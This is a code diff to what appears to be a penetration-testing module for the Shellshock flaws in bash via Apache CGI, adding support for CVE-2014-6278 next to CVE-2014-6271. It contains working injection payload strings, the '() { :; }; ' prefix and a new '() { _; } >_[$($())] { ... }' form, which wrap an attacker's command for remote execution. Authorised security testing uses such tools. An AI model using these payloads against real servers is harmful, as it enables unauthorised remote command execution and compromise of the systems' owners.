@@ -15,7 +15,7 @@ from src.core.requests import headers
 from src.core.requests import parameters
 
 """
-This module exploits the vulnerability "CVE-2014-6271" [1] in Apache CGI.
+This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
 [1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
 """
 
@@ -29,6 +29,7 @@ headers = [
 # Available Shellshock CVEs
 shellshock_cves = [
 "CVE-2014-6271",
+"CVE-2014-6278"
 ]
 
 """
@@ -37,6 +38,8 @@ Available shellshock payloads
 def shellshock_payloads(cve, attack_vector):
   if cve == shellshock_cves[0] :
     payload = "() { :; }; " + attack_vector
+  elif cve == shellshock_cves[1] :
+    payload = "() { _; } >_[$($())] { " + attack_vector + " } "
   else:
     pass
   return payload
